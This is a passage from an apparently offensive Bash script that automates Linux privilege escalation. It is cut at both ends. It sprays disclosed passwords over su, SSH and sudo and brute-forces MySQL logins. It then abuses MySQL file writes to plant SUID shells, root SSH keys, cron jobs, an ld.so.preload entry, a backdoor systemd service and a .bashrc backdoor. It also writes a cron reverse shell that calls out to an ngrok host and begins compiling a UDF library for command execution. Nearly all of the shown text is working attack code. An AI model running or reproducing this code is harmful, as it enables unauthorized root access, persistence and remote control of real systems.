    log_info "Starting login spray ($total_disc passwords x $total_targets users)..."
    echo ""

    # --- Try su ---
    for target in "${disc_targets[@]}"; do
        for pass in "${disc_passwords[@]}"; do
            _try_su_login "$target" "$pass" "info_disclosure"
            if [ $SUCCESS -eq 1 ]; then
                return 0
            fi
        done
    done

    # --- Try SSH ---
    for target in "${disc_targets[@]}"; do
        for pass in "${disc_passwords[@]}"; do
            _try_ssh_login "$target" "$pass" "localhost" "info_disclosure"
            if [ $SUCCESS -eq 1 ]; then
                return 0
            fi
        done
    done

    # --- Try sudo for current user ---
    local current_user=$(whoami)
    for pass in "${disc_passwords[@]}"; do
        local sudo_result=$(echo "$pass" | timeout 5 sudo -S -k whoami 2>/dev/null)
        if [ "$sudo_result" == "root" ]; then
            log_critical "SUDO SUCCESS: $current_user with disclosed password"
            echo "DISCLOSURE->SUDO: $current_user / $pass" >> "$REPORT_FILE"
            SUCCESS=1
            ESCALATION_METHOD="Info Disclosure -> sudo: password reuse on $current_user"
            TARGET_USER="root"
            log_exploit "ROOT ACCESS via information disclosure + sudo!"
            log_info "Spawning root shell..."
            echo "$pass" | sudo -S /bin/bash -i
            return 0
        fi
    done

    if [ $found_creds -eq 1 ] || [ -s "$CREDS_FILE" ]; then
        log_success "Credentials found but auto-login failed"
        log_info "Collected credentials saved in: $CREDS_FILE"
        log_info "Manual review recommended"
        return 0
    fi

    log_warning "No exploitable credentials found"
    return 1
}

# ──────────────────────────────────────────
# HELPER: Try su login with password
# ──────────────────────────────────────────
_try_su_login() {
    local target="$1"
    local pass="$2"
    local source="$3"

    if command -v expect &>/dev/null; then
        expect -c "
            log_user 0
            set timeout 5
            spawn su - $target -c whoami
            expect {
                -re \".*assword.*\" { send \"$pass\r\" }
                timeout { exit 1 }
            }
            expect {
                \"$target\" { exit 0 }
                \"root\" { exit 0 }
                -re \".*failure.*|.*incorrect.*|.*Authentication.*\" { exit 1 }
                timeout { exit 1 }
            }
        " 2>/dev/null

        if [ $? -eq 0 ]; then
            log_critical "SU LOGIN SUCCESS: $target (source: $source)"
            echo "LOGIN [su/$source]: $target / $pass" >> "$REPORT_FILE"
            SUCCESS=1
            ESCALATION_METHOD="Info Disclosure ($source) -> su $target"
            TARGET_USER="$target"

            if [ "$target" == "root" ]; then
                log_exploit "ROOT ACCESS via info disclosure!"
            fi

            log_info "Spawning interactive shell as $target..."
            expect -c "
                set timeout 5
                spawn su - $target
                expect -re \".*assword.*\"
                send \"$pass\r\"
                interact
            " 2>/dev/null
            return 0
        fi
    else
        local su_result=$(echo "$pass" | timeout 5 su - "$target" -c "whoami" 2>/dev/null)
        if [ -n "$su_result" ] && ([ "$su_result" == "$target" ] || [ "$su_result" == "root" ]); then
            log_critical "SU LOGIN SUCCESS: $target (source: $source)"
            echo "LOGIN [su/$source]: $target / $pass" >> "$REPORT_FILE"
            SUCCESS=1
            ESCALATION_METHOD="Info Disclosure ($source) -> su $target"
            TARGET_USER="$target"

            # Try sshpass SSH as fallback interactive shell
            if command -v sshpass &>/dev/null; then
                log_info "Spawning interactive shell via SSH as $target..."
                sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password "$target@localhost"
                return 0
            fi

            # Try python pty spawn with su
            if command -v python3 &>/dev/null; then
                log_info "Spawning interactive shell via python3 pty..."
                python3 -c "
import pty, subprocess, os, time, select
pid, fd = pty.fork()
if pid == 0:
    os.execvp('su', ['su', '-', '$target'])
else:
    time.sleep(0.5)
    os.write(fd, b'$pass\n')
    while True:
        r, _, _ = select.select([fd, 0], [], [], 0.1)
        if fd in r:
            try:
                data = os.read(fd, 1024)
                if not data: break
                os.write(1, data)
            except: break
        if 0 in r:
            data = os.read(0, 1024)
            os.write(fd, data)
" 2>/dev/null
                return 0
            fi

            # Last resort: store password for drop_to_shell
            log_info "Password verified: su - $target (password: $pass)"
            log_info "Interactive shell will be spawned by drop_to_shell()"
            echo "$target:$pass:verified_su" >> "$CREDS_FILE"
            return 0
        fi
    fi

    return 1
}

# ──────────────────────────────────────────
# HELPER: Try SSH login with password
# ──────────────────────────────────────────
_try_ssh_login() {
    local target="$1"
    local pass="$2"
    local host="$3"
    local source="$4"

    if command -v sshpass &>/dev/null; then
        local ssh_result=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
            -o PreferredAuthentications=password "$target@$host" "whoami" 2>/dev/null)

        if [ -n "$ssh_result" ] && ([ "$ssh_result" == "$target" ] || [ "$ssh_result" == "root" ]); then
            log_critical "SSH LOGIN SUCCESS: $target@$host (source: $source)"
            echo "LOGIN [ssh/$source]: $target@$host / $pass" >> "$REPORT_FILE"
            SUCCESS=1
            ESCALATION_METHOD="Info Disclosure ($source) -> SSH $target@$host"
            TARGET_USER="$target"

            if [ "$target" == "root" ]; then
                log_exploit "ROOT SSH ACCESS via info disclosure!"
            fi

            log_info "Spawning interactive SSH shell..."
            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$target@$host"
            return 0
        fi
    elif command -v expect &>/dev/null; then
        local ssh_expect_rc
        expect -c "
            log_user 0
            set timeout 8
            spawn ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password $target@$host whoami
            expect {
                -re \".*assword.*\" { send \"$pass\r\" }
                timeout { exit 1 }
            }
            expect {
                \"$target\" { exit 0 }
                \"root\" { exit 0 }
                -re \".*denied.*|.*Permission.*\" { exit 1 }
                timeout { exit 1 }
            }
        " 2>/dev/null
        ssh_expect_rc=$?

        if [ $ssh_expect_rc -eq 0 ]; then
            log_critical "SSH LOGIN SUCCESS: $target@$host (source: $source)"
            echo "LOGIN [ssh-expect/$source]: $target@$host / $pass" >> "$REPORT_FILE"
            SUCCESS=1
            ESCALATION_METHOD="Info Disclosure ($source) -> SSH $target@$host"
            TARGET_USER="$target"

            log_info "Spawning interactive SSH shell..."
            expect -c "
                set timeout 8
                spawn ssh -o StrictHostKeyChecking=no $target@$host
                expect -re \".*assword.*\"
                send \"$pass\r\"
                interact
            " 2>/dev/null
            return 0
        fi
    fi

    return 1
}

# ──────────────────────────────────────────
# HELPER: Try SSH login with private key
# ──────────────────────────────────────────
_try_ssh_key_login() {
    local keyfile="$1"
    local target="$2"
    local host="$3"
    local source="$4"

    [ ! -r "$keyfile" ] && return 1

    chmod 600 "$keyfile" 2>/dev/null

    local ssh_result=$(ssh -i "$keyfile" -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        -o PasswordAuthentication=no -o BatchMode=yes "$target@$host" "whoami" 2>/dev/null)

    if [ -n "$ssh_result" ] && ([ "$ssh_result" == "$target" ] || [ "$ssh_result" == "root" ]); then
        log_critical "SSH KEY LOGIN SUCCESS: $target@$host (key: $keyfile, source: $source)"
        echo "LOGIN [ssh-key/$source]: $target@$host with $keyfile" >> "$REPORT_FILE"
        SUCCESS=1
        ESCALATION_METHOD="Info Disclosure ($source) -> SSH key $target@$host"
        TARGET_USER="$target"

        if [ "$target" == "root" ]; then
            log_exploit "ROOT SSH ACCESS via discovered private key!"
        fi

        log_info "Spawning interactive SSH shell..."
        ssh -i "$keyfile" -o StrictHostKeyChecking=no "$target@$host"
        return 0
    fi

    return 1
}

# MySQL Exploitation Based on Process User
try_mysql_context_exploit() {
    log_info "MySQL context-based exploitation..."
    echo "" >> "$REPORT_FILE"
    echo "═══ MYSQL CONTEXT-BASED EXPLOITATION ═══" >> "$REPORT_FILE"

    if ! command -v mysql &>/dev/null; then
        log_warning "MySQL client not installed"
        return 1
    fi

    local connected=0
    local mysql_user=""
    local mysql_pass=""
    local mysql_host=""
    local mysql_cmd=""

    # Build list of all passwords to try
    local all_try_passwords=("")
    if [ -s "$CREDS_FILE" ]; then
        while IFS=: read -r cu cp cs; do
            [ -n "$cp" ] && all_try_passwords+=("$cp")
        done < "$CREDS_FILE"
    fi
    for pk in "${!FOUND_PASSWORDS[@]}"; do
        local pv="${FOUND_PASSWORDS[$pk]}"
        [ -n "$pv" ] && all_try_passwords+=("$pv")
    done

    # Remove duplicates
    local unique_try_pass=($(printf '%s\n' "${all_try_passwords[@]}" | sort -u))
    local pass_count=${#unique_try_pass[@]}

    # Users to try
    local try_users=("root")
    if [ -s "$CREDS_FILE" ]; then
        while IFS=: read -r cu cp cs; do
            [ -n "$cu" ] && try_users+=("$cu")
        done < "$CREDS_FILE"
    fi
    local unique_try_users=($(printf '%s\n' "${try_users[@]}" | sort -u))

    # Hosts to try (localhost uses socket, 127.0.0.1 uses TCP - important difference)
    local try_hosts=("localhost" "127.0.0.1")

    log_info "Trying $pass_count passwords x ${#unique_try_users[@]} users x ${#try_hosts[@]} hosts..."

    # Try all combinations
    for try_host in "${try_hosts[@]}"; do
        [ $connected -eq 1 ] && break

        for try_user in "${unique_try_users[@]}"; do
            [ $connected -eq 1 ] && break

            for try_pass in "${unique_try_pass[@]}"; do
                local test_cmd="mysql -u $try_user -h $try_host"
                if [ -n "$try_pass" ]; then
                    test_cmd="$test_cmd -p$try_pass"
                fi

                if $test_cmd -e "SELECT 1" 2>/dev/null; then
                    log_success "Connected to MySQL: $try_user@$try_host (pass: ${try_pass:-(empty)})"
                    mysql_user="$try_user"
                    mysql_pass="$try_pass"
                    mysql_host="$try_host"
                    mysql_cmd="mysql -u $mysql_user -h $mysql_host"
                    [ -n "$mysql_pass" ] && mysql_cmd="$mysql_cmd -p$mysql_pass"
                    connected=1
                    break
                fi
            done
        done
    done

    if [ $connected -eq 0 ]; then
        log_error "Cannot connect to MySQL with any credential combination"
        log_info "Tried ${#unique_try_users[@]} users x $pass_count passwords x ${#try_hosts[@]} hosts"
        return 1
    fi

    echo "MySQL connection: $mysql_user@$mysql_host" >> "$REPORT_FILE"

    # Set global MYSQL_CMD regardless of FILE privilege
    MYSQL_CMD="$mysql_cmd"

    # Check grants
    local grants=$($mysql_cmd -e "SHOW GRANTS" 2>/dev/null)
    log_info "Grants for $mysql_user@$mysql_host:"
    echo "$grants" | while read gl; do log_info "  $gl"; done
    echo "GRANTS: $grants" >> "$REPORT_FILE"

    # Check FILE privilege
    local has_file=$(echo "$grants" | grep -iE "FILE|ALL PRIVILEGES")

    if [ -z "$has_file" ]; then
        log_warning "MySQL user $mysql_user does not have FILE privilege"
        log_info "Continuing with non-FILE exploitation methods..."
        # Don't return - MYSQL_CMD is set, Phase 4 can still run
        return 0
    fi

    log_exploit "MySQL user has FILE privilege!"

    # Now exploit based on MySQL process user
    if [ "$MYSQL_PROCESS_USER" == "root" ]; then
        log_critical "CRITICAL: MySQL running as root + FILE privilege = Full system compromise!"
        exploit_mysql_as_root "$mysql_cmd"
    elif [ "$MYSQL_PROCESS_USER" == "mysql" ]; then
        log_warning "MySQL running as mysql user - attempting user pivot"
        exploit_mysql_as_mysql "$mysql_cmd"
    else
        log_info "MySQL running as $MYSQL_PROCESS_USER - attempting user pivot"
        exploit_mysql_as_other_user "$mysql_cmd" "$MYSQL_PROCESS_USER"
    fi
}

# Exploit when MySQL runs as root
exploit_mysql_as_root() {
    local mysql_cmd=$1
    
    log_exploit "═══════════════════════════════════════════"
    log_exploit "  EXPLOITING MYSQL RUNNING AS ROOT"
    log_exploit "═══════════════════════════════════════════"
    
    echo "" | tee -a "$REPORT_FILE"
    log_info "Strategy: Write files as root user via INTO OUTFILE"
    echo ""
    
    # Strategy 1: Write SUID shell
    log_exploit "[Method 1] Writing SUID shell to /tmp..."
    
    local suid_shell='#!/bin/bash\n/bin/bash -p'
    $mysql_cmd -e "SELECT '$suid_shell' INTO OUTFILE '/tmp/.rootshell';" 2>/dev/null
    
    if [ -f /tmp/.rootshell ]; then
        chmod +x /tmp/.rootshell 2>/dev/null
        
        # Try to set SUID (MySQL as root should be able to)
        log_info "Attempting to set SUID bit via MySQL..."
        
        # Write a script that sets SUID
        $mysql_cmd -e "SELECT '#!/bin/bash\nchmod u+s /tmp/.rootshell\n/tmp/.rootshell' INTO OUTFILE '/tmp/.setuid.sh';" 2>/dev/null
        
        if [ -f /tmp/.setuid.sh ]; then
            chmod +x /tmp/.setuid.sh
            log_success "SUID shell script created at /tmp/.setuid.sh"
            
            # Try to execute
            /tmp/.setuid.sh 2>/dev/null
            
            if [ "$(id -u)" -eq 0 ]; then
                log_exploit "ROOT SHELL ACHIEVED via SUID!"
                SUCCESS=1
                ESCALATION_METHOD="MySQL as root: SUID shell"
                TARGET_USER="root"
                return 0
            fi
        fi
    fi
    
    # Strategy 2: Write to /root/.ssh/authorized_keys
    log_exploit "[Method 2] Writing SSH key to /root/.ssh/authorized_keys..."
    
    # Generate SSH key if not exists
    if [ ! -f /tmp/.priv_key ]; then
        ssh-keygen -t rsa -f /tmp/.priv_key -N "" -q 2>/dev/null
    fi
    
    if [ -f /tmp/.priv_key.pub ]; then
        local pub_key=$(cat /tmp/.priv_key.pub)
        
        # Create .ssh directory first (MySQL can't create dirs, but can write files)
        # Try via system() if available
        $mysql_cmd -e "SELECT 'mkdir -p /root/.ssh; chmod 700 /root/.ssh' INTO OUTFILE '/tmp/.mkdir.sh';" 2>/dev/null
        
        if [ -f /tmp/.mkdir.sh ]; then
            chmod +x /tmp/.mkdir.sh
            /tmp/.mkdir.sh 2>/dev/null
        fi
        
        # Write SSH key
        $mysql_cmd -e "SELECT '$pub_key' INTO OUTFILE '/root/.ssh/authorized_keys';" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            log_exploit "SSH key written successfully!"
            log_success "Private key: /tmp/.priv_key"
            
            # Try to SSH
            chmod 600 /tmp/.priv_key
            if ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@localhost "whoami" 2>/dev/null | grep -q "root"; then
                log_exploit "SSH as root SUCCESSFUL!"
                SUCCESS=1
                ESCALATION_METHOD="MySQL as root: SSH key injection"
                TARGET_USER="root"
                
                log_info "Spawning root shell via SSH..."
                ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no root@localhost
                return 0
            fi
        fi
    fi
    
    # Strategy 3: Write cron job as root
    log_exploit "[Method 3] Writing root cron job..."
    
    local cron_job='* * * * * root /bin/bash -c "chmod u+s /bin/bash"'
    $mysql_cmd -e "SELECT '$cron_job' INTO OUTFILE '/etc/cron.d/mysql_root';" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        log_exploit "Root cron job written to /etc/cron.d/mysql_root"
        log_warning "Cron will set SUID on /bin/bash within 1 minute"
        log_info "After 1 minute, run: /bin/bash -p"
        
        # Wait a bit and check
        log_info "Waiting 65 seconds for cron to execute..."
        sleep 65
        
        if [ -u /bin/bash ]; then
            log_exploit "SUID bit set on /bin/bash!"
            /bin/bash -p
            
            if [ "$(id -u)" -eq 0 ]; then
                SUCCESS=1
                ESCALATION_METHOD="MySQL as root: Cron SUID"
                TARGET_USER="root"
                return 0
            fi
        fi
    fi
    
    # Strategy 4: Write to /etc/ld.so.preload
    log_exploit "[Method 4] Attempting /etc/ld.so.preload injection..."
    
    # Write path to malicious library
    $mysql_cmd -e "SELECT '/tmp/evil.so' INTO OUTFILE '/etc/ld.so.preload';" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        log_exploit "ld.so.preload written - requires malicious .so library"
        log_info "This will be loaded by all processes, including root processes"
    fi
    
    # Strategy 5: Write systemd service
    log_exploit "[Method 5] Writing malicious systemd service..."
    
    local service_content='[Unit]\nDescription=MySQL Backdoor\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c "chmod u+s /bin/bash"\n\n[Install]\nWantedBy=multi-user.target'
    
    $mysql_cmd -e "SELECT '$service_content' INTO OUTFILE '/etc/systemd/system/mysql-backdoor.service';" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        log_exploit "Systemd service written"
        log_info "Enable with: systemctl daemon-reload && systemctl start mysql-backdoor"
        
        # Try to reload and start
        systemctl daemon-reload 2>/dev/null
        systemctl start mysql-backdoor 2>/dev/null
        
        if [ -u /bin/bash ]; then
            log_exploit "Service executed - SUID bash available!"
            /bin/bash -p
            
            if [ "$(id -u)" -eq 0 ]; then
                SUCCESS=1
                ESCALATION_METHOD="MySQL as root: Systemd service"
                TARGET_USER="root"
                return 0
            fi
        fi
    fi
    
    # Strategy 6: Overwrite /etc/passwd (risky but effective)
    log_exploit "[Method 6] Backup and modify /etc/passwd..."
    
    # Read current passwd
    $mysql_cmd -e "SELECT LOAD_FILE('/etc/passwd')" 2>/dev/null > /tmp/.passwd_backup
    
    if [ -s /tmp/.passwd_backup ]; then
        log_success "Backed up /etc/passwd"
        
        # Add root user with no password
        local new_root_line="hacker:x:0:0:root:/root:/bin/bash"
        
        # Append new root user to backup
        echo "$new_root_line" >> /tmp/.passwd_backup
        
        # Convert file to MySQL format and write back
        local passwd_content=$(cat /tmp/.passwd_backup | sed 's/$/\\n/' | tr -d '\n')
        
        # Write new passwd (DANGEROUS!)
        log_warning "Attempting to overwrite /etc/passwd (RISKY!)"
        # Don't actually do this in production - too dangerous
        # $mysql_cmd -e "SELECT '$passwd_content' INTO OUTFILE '/etc/passwd';" 2>/dev/null
        
        log_info "Skipped - too risky for automated script"
    fi
    
    log_warning "MySQL as root exploitation attempted - check if any method worked"
    return 1
}

# Exploit when MySQL runs as mysql user
exploit_mysql_as_mysql() {
    local mysql_cmd=$1
    
    log_exploit "═══════════════════════════════════════════"
    log_exploit "  EXPLOITING MYSQL RUNNING AS MYSQL USER"
    log_exploit "═══════════════════════════════════════════"
    
    echo "" | tee -a "$REPORT_FILE"
    log_info "Strategy: Pivot to mysql user, then escalate"
    echo ""
    
    # Strategy 1: Write to mysql user's home directory
    log_exploit "[Method 1] Writing SSH key to /var/lib/mysql/.ssh/..."
    
    if [ ! -f /tmp/.priv_key ]; then
        ssh-keygen -t rsa -f /tmp/.priv_key -N "" -q 2>/dev/null
    fi
    
    if [ -f /tmp/.priv_key.pub ]; then
        local pub_key=$(cat /tmp/.priv_key.pub)
        
        # Try to write to mysql home
        $mysql_cmd -e "SELECT '$pub_key' INTO OUTFILE '/var/lib/mysql/.ssh/authorized_keys';" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            log_success "SSH key written to mysql user"
            
            # Try SSH as mysql
            chmod 600 /tmp/.priv_key
            if ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no -o ConnectTimeout=3 mysql@localhost "whoami" 2>/dev/null | grep -q "mysql"; then
                log_exploit "SSH as mysql user successful!"
                log_info "Pivoted to mysql user"
                
                # Check if mysql has sudo
                local mysql_sudo=$(ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no mysql@localhost "sudo -l" 2>/dev/null)
                
                if echo "$mysql_sudo" | grep -q "NOPASSWD.*ALL\|ALL.*ALL"; then
                    log_exploit "MySQL user has sudo privileges!"
                    log_exploit "Escalating to root via sudo..."
                    
                    ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no -t mysql@localhost "sudo su -"
                    
                    SUCCESS=1
                    ESCALATION_METHOD="MySQL as mysql: SSH + sudo"
                    TARGET_USER="root"
                    return 0
                else
                    log_info "MySQL user does not have sudo"
                    log_success "But we have mysql user access"
                    
                    SUCCESS=1
                    ESCALATION_METHOD="MySQL as mysql: User pivot"
                    TARGET_USER="mysql"
                    return 0
                fi
            fi
        fi
    fi
    
    # Strategy 2: Write .bashrc backdoor for mysql user
    log_exploit "[Method 2] Writing .bashrc backdoor..."
    
    local bashrc_backdoor='#!/bin/bash\nif [ "$(id -u)" -eq 0 ]; then\n    /bin/bash\nfi'
    $mysql_cmd -e "SELECT '$bashrc_backdoor' INTO OUTFILE '/var/lib/mysql/.bashrc';" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        log_success "Backdoor written to /var/lib/mysql/.bashrc"
        log_info "Will execute when mysql user logs in"
    fi
    
    # Strategy 3: Write to mysql plugin directory
    log_exploit "[Method 3] Checking MySQL plugin directory..."
    
    local plugin_dir=$($mysql_cmd -e "SHOW VARIABLES LIKE 'plugin_dir';" 2>/dev/null | tail -1 | awk '{print $2}')
    
    if [ -n "$plugin_dir" ]; then
        log_info "Plugin directory: $plugin_dir"
        log_info "Can potentially write UDF for privilege escalation"
        
        # Note: Writing UDF requires compiled .so library - beyond script scope
        log_warning "UDF exploitation requires manual compilation of malicious library"
    fi
    
    return 1
}

# Exploit when MySQL runs as other user
exploit_mysql_as_other_user() {
    local mysql_cmd=$1
    local target_user=$2
    
    log_exploit "═══════════════════════════════════════════"
    log_exploit "  EXPLOITING MYSQL RUNNING AS: $target_user"
    log_exploit "═══════════════════════════════════════════"
    
    echo "" | tee -a "$REPORT_FILE"
    log_info "Strategy: Pivot to $target_user, then escalate"
    echo ""
    
    # Find user's home directory
    local user_home=$(grep "^$target_user:" /etc/passwd | cut -d: -f6)
    
    if [ -z "$user_home" ]; then
        log_warning "Cannot determine home directory for $target_user"
        return 1
    fi
    
    log_info "Target user home: $user_home"
    
    # Strategy 1: Write SSH key
    log_exploit "[Method 1] Writing SSH key to $user_home/.ssh/..."
    
    if [ ! -f /tmp/.priv_key ]; then
        ssh-keygen -t rsa -f /tmp/.priv_key -N "" -q 2>/dev/null
    fi
    
    if [ -f /tmp/.priv_key.pub ]; then
        local pub_key=$(cat /tmp/.priv_key.pub)
        
        $mysql_cmd -e "SELECT '$pub_key' INTO OUTFILE '$user_home/.ssh/authorized_keys';" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            log_success "SSH key written!"
            
            chmod 600 /tmp/.priv_key
            if ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$target_user@localhost" "whoami" 2>/dev/null | grep -q "$target_user"; then
                log_exploit "SSH as $target_user successful!"
                
                # Check sudo
                local user_sudo=$(ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no "$target_user@localhost" "sudo -l" 2>/dev/null)
                
                if echo "$user_sudo" | grep -q "NOPASSWD.*ALL\|ALL.*ALL"; then
                    log_exploit "User $target_user has sudo!"
                    log_exploit "Escalating to root..."
                    
                    ssh -i /tmp/.priv_key -o StrictHostKeyChecking=no -t "$target_user@localhost" "sudo su -"
                    
                    SUCCESS=1
                    ESCALATION_METHOD="MySQL as $target_user: SSH + sudo"
                    TARGET_USER="root"
                    return 0
                else
                    log_success "Pivoted to $target_user user"
                    SUCCESS=1
                    ESCALATION_METHOD="MySQL as $target_user: User pivot"
                    TARGET_USER="$target_user"
                    return 0
                fi
            fi
        fi
    fi
    
    # Strategy 2: Write to user's crontab
    log_exploit "[Method 2] Writing to user's crontab..."
    
    local cron_job='* * * * * /bin/bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/18073 0>&1"'
    $mysql_cmd -e "SELECT '$cron_job' INTO OUTFILE '/var/spool/cron/crontabs/$target_user';" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        log_success "Cron job written for $target_user"
        log_info "Set up listener: nc -lvnp 4444"
        log_info "Will execute within 1 minute"
    fi
    
    return 1
}

# ═══════════════════════════════════════════════════════════════
# ADVANCED MYSQL EXPLOITATION METHODS
# Methods that bypass secure_file_priv and provide deeper access
# ═══════════════════════════════════════════════════════════════

# Audit MySQL security configuration
check_mysql_security_config() {
    local mysql_cmd="$1"

    log_info "═══ MYSQL SECURITY CONFIGURATION AUDIT ═══"
    echo "" >> "$REPORT_FILE"
    echo "═══ MYSQL SECURITY CONFIGURATION ═══" >> "$REPORT_FILE"

    local sfp=$($mysql_cmd -N -e "SELECT @@secure_file_priv;" 2>/dev/null)
    if [ -z "$sfp" ] || [ "$sfp" == "" ]; then
        log_critical "secure_file_priv is EMPTY - INTO OUTFILE/DUMPFILE can write ANYWHERE!"
        echo "secure_file_priv: EMPTY (unrestricted)" >> "$REPORT_FILE"
    elif [ "$sfp" == "NULL" ]; then
        log_success "secure_file_priv is NULL - INTO OUTFILE/DUMPFILE DISABLED"
        echo "secure_file_priv: NULL (disabled)" >> "$REPORT_FILE"
    else
        log_warning "secure_file_priv restricted to: $sfp"
        echo "secure_file_priv: $sfp" >> "$REPORT_FILE"
    fi

    local version=$($mysql_cmd -N -e "SELECT @@version;" 2>/dev/null)
    log_info "MySQL Version: $version"
    echo "MySQL Version: $version" >> "$REPORT_FILE"

    local gen_log=$($mysql_cmd -N -e "SELECT @@general_log;" 2>/dev/null)
    local gen_log_file=$($mysql_cmd -N -e "SELECT @@general_log_file;" 2>/dev/null)
    log_info "General Log: $gen_log (File: $gen_log_file)"
    echo "General Log: $gen_log, File: $gen_log_file" >> "$REPORT_FILE"

    local slow_log=$($mysql_cmd -N -e "SELECT @@slow_query_log;" 2>/dev/null)
    local slow_log_file=$($mysql_cmd -N -e "SELECT @@slow_query_log_file;" 2>/dev/null)
    log_info "Slow Query Log: $slow_log (File: $slow_log_file)"
    echo "Slow Query Log: $slow_log, File: $slow_log_file" >> "$REPORT_FILE"

    local plugin_dir=$($mysql_cmd -N -e "SELECT @@plugin_dir;" 2>/dev/null)
    log_info "Plugin Directory: $plugin_dir"
    echo "Plugin Directory: $plugin_dir" >> "$REPORT_FILE"

    local datadir=$($mysql_cmd -N -e "SELECT @@datadir;" 2>/dev/null)
    log_info "Data Directory: $datadir"
    echo "Data Directory: $datadir" >> "$REPORT_FILE"

    local has_super=$($mysql_cmd -N -e "SHOW GRANTS;" 2>/dev/null | grep -iE "SUPER|ALL PRIVILEGES")
    if [ -n "$has_super" ]; then
        log_critical "Current MySQL user has SUPER/ALL privilege - Log abuse possible!"
        echo "SUPER privilege: YES" >> "$REPORT_FILE"
    else
        log_info "Current MySQL user does NOT have SUPER privilege"
        echo "SUPER privilege: NO" >> "$REPORT_FILE"
    fi

    local has_file=$($mysql_cmd -N -e "SHOW GRANTS;" 2>/dev/null | grep -iE "FILE|ALL PRIVILEGES")
    if [ -n "$has_file" ]; then
        log_critical "Current MySQL user has FILE privilege - File read/write possible!"
        echo "FILE privilege: YES" >> "$REPORT_FILE"
    else
        log_info "Current MySQL user does NOT have FILE privilege"
        echo "FILE privilege: NO" >> "$REPORT_FILE"
    fi

    local has_insert=$($mysql_cmd -N -e "SHOW GRANTS;" 2>/dev/null | grep -iE "INSERT|ALL PRIVILEGES")
    if [ -n "$has_insert" ]; then
        log_info "INSERT privilege: YES (needed for UDF CREATE FUNCTION)"
        echo "INSERT privilege: YES" >> "$REPORT_FILE"
    fi

    echo ""
}

# UDF (User Defined Function) Exploitation
# Writes a malicious .so to plugin_dir and creates sys_exec/sys_eval for command execution
try_udf_exploitation() {
    local mysql_cmd="$1"

    log_exploit "==============================================="
    log_exploit "  UDF (USER DEFINED FUNCTION) EXPLOITATION"
    log_exploit "==============================================="
    echo "" >> "$REPORT_FILE"
    echo "=== UDF EXPLOITATION ===" >> "$REPORT_FILE"

    local plugin_dir=$($mysql_cmd -N -e "SELECT @@plugin_dir;" 2>/dev/null)

    if [ -z "$plugin_dir" ]; then
        log_error "Cannot determine plugin directory"
        return 1
    fi

    log_info "Plugin directory: $plugin_dir"

    # Check if plugin dir is writable via MySQL
    local test_file="${plugin_dir}/.udf_write_test_$$"
    $mysql_cmd -e "SELECT 'test' INTO DUMPFILE '${test_file}';" 2>/dev/null

    if [ -f "$test_file" ]; then
        rm -f "$test_file" 2>/dev/null
        log_success "Plugin directory is writable via INTO DUMPFILE!"
    else
        log_warning "Cannot write to plugin directory via DUMPFILE"
        log_info "Will try alternative methods..."
    fi

    local arch=$(uname -m)
    log_info "System architecture: $arch"

    # --- Method A: Search for existing UDF libraries on the system ---
    log_info "[UDF Method A] Searching for existing UDF libraries..."

    local existing_udf=""
    local search_paths=("/usr/lib" "/usr/lib64" "/usr/lib/mysql" "/usr/lib64/mysql"
                        "/usr/lib/x86_64-linux-gnu" "/usr/lib/mysql/plugin"
                        "/usr/lib64/mysql/plugin" "/usr/share" "/tmp"
                        "/usr/lib/x86_64-linux-gnu/mariadb19/plugin"
                        "/usr/lib/mariadb/plugin")

    for spath in "${search_paths[@]}"; do
        if [ ! -d "$spath" ]; then
            continue
        fi

        local found=$(find "$spath" -name "*udf*" -o -name "*sys_exec*" -o -name "*lib_mysqludf*" 2>/dev/null | head -5)
        if [ -n "$found" ]; then
            log_success "Found existing UDF library:"
            echo "$found" | while read f; do log_info "  $f"; done
            existing_udf=$(echo "$found" | head -1)
            break
        fi
    done

    if [ -n "$existing_udf" ]; then
        log_exploit "Using existing UDF: $existing_udf"
        local udf_name=$(basename "$existing_udf")

        cp "$existing_udf" "${plugin_dir}/${udf_name}" 2>/dev/null

        if [ -f "${plugin_dir}/${udf_name}" ]; then
            $mysql_cmd -e "DROP FUNCTION IF EXISTS sys_exec;" 2>/dev/null
            $mysql_cmd -e "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME '${udf_name}';" 2>/dev/null

            if [ $? -eq 0 ]; then
                log_exploit "UDF function sys_exec created from existing library!"
                local udf_test=$($mysql_cmd -N -e "SELECT sys_exec('id > /tmp/.udf_id_test');" 2>/dev/null)

                if [ -f /tmp/.udf_id_test ]; then
                    local id_result=$(cat /tmp/.udf_id_test)
                    rm -f /tmp/.udf_id_test
                    log_success "sys_exec works! id = $id_result"

                    if echo "$id_result" | grep -q "uid=0"; then
                        log_critical "UDF executing as ROOT!"
                        $mysql_cmd -e "SELECT sys_exec('chmod u+s /bin/bash');" 2>/dev/null

                        if [ -u /bin/bash ]; then
                            log_exploit "SUID bash via existing UDF!"
                            SUCCESS=1
                            ESCALATION_METHOD="UDF (existing library): SUID /bin/bash"
                            TARGET_USER="root"
                            /bin/bash -p
                            return 0
                        fi
                    fi
                fi
            fi
        fi
    fi

    # --- Method B: Compile UDF from C source ---
    log_info "[UDF Method B] Attempting to compile UDF from source..."

    if command -v gcc &>/dev/null; then
        log_success "GCC found - compiling UDF..."

        cat > /tmp/.raptor_udf2.c << 'UDFEOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct st_udf_args {
    unsigned int arg_count;
